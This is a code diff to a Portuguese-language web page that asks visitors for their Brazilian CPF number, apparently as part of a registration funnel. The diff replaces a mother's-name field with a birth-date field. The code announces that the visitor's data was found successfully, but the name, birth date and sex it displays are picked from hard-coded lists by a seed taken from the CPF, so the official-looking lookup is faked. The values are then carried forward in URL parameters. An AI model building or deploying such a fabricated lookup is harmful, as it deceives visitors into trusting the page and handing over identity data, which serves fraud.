@@ -168,7 +168,7 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
                 <p>Dados encontrados com sucesso!</p>
             </div>
             <p>Iniciando cadastro de <strong><span id="nomeCompleto"></span></strong></p>
-            <p><strong>Nome da Mãe:</strong> <span id="nomeMae"></span></p>
+            <p><strong>Data de Nascimento:</strong> <span id="nascimento"></span></p>
             <p><strong>Sexo:</strong> <span id="sexo"></span></p>
             <button class="btn-custom" onclick="continuar()">Continuar</button>
         </div>
@@ -202,10 +202,10 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
                 "ANTONIO FERNANDES DIAS", "PATRICIA GOMES RIBEIRO", "JOSE BARBOSA NUNES"
             ];
             
-            const nomesMae = [
-                "MARIA SILVA", "JOANA OLIVEIRA", "ROSA PEREIRA",
-                "HELENA SOUZA", "CARMEN RODRIGUES", "TEREZA MARTINS",
-                "FRANCISCA FERNANDES", "ANTONIA GOMES", "CONCEICAO BARBOSA"
+            const datasNascimento = [
+                "12/03/1985", "27/07/1990", "05/11/1978",
+                "19/01/1994", "08/06/1982", "23/09/1988",
+                "14/04/1975", "30/12/1991", "02/08/1987"
             ];
             const sexos = ["MASCULINO", "FEMININO"];
             
@@ -214,7 +214,7 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
             
             return {
                 NOME: nomes[seed % nomes.length],
-                MAE: nomesMae[seed % nomesMae.length],
+                NASCIMENTO: datasNascimento[seed % datasNascimento.length],
                 SEXO: sexos[seed % 2],
                 CPF_FORMATADO: cpf
             };
@@ -253,17 +253,15 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
             try {
                 const responseCPF = await getCPF(cpf);
                     const nomeCompleto = responseCPF.NOME || "Dados não encontrados";
-                    const nomeMae = responseCPF.MAE || "Não informado";
                     const sexo = responseCPF.SEXO || "Não informado";
                     const cpfFormatado = responseCPF.CPF_FORMATADO || cpf;
-                    const nascimento = responseCPF.NASCIMENTO || responseCPF.NASC || null;
+                    const nascimento = responseCPF.NASCIMENTO || responseCPF.NASC || "Não informado";
                     document.getElementById("nomeCompleto").innerText = nomeCompleto;
-                    document.getElementById("nomeMae").innerText = nomeMae;
+                    document.getElementById("nascimento").innerText = nascimento;
                     document.getElementById("sexo").innerText = sexo;
                     // Salvar os dados no localStorage
                     localStorage.setItem("dadosCPF", JSON.stringify({
                         nomeCompleto,
-                        nomeMae,
                         sexo,
                         cpfFormatado,
                         nascimento,
@@ -288,7 +286,6 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
                 const dados = JSON.parse(dadosCPF);
                 currentParams.set('cpf', dados.cpf);
                 if (dados.nomeCompleto) currentParams.set('nome', dados.nomeCompleto);
-                if (dados.nomeMae) currentParams.set('mae', dados.nomeMae);
                 if (dados.sexo) currentParams.set('sexo', dados.sexo);
                 if (dados.nascimento) currentParams.set('nascimento', dados.nascimento);
             }
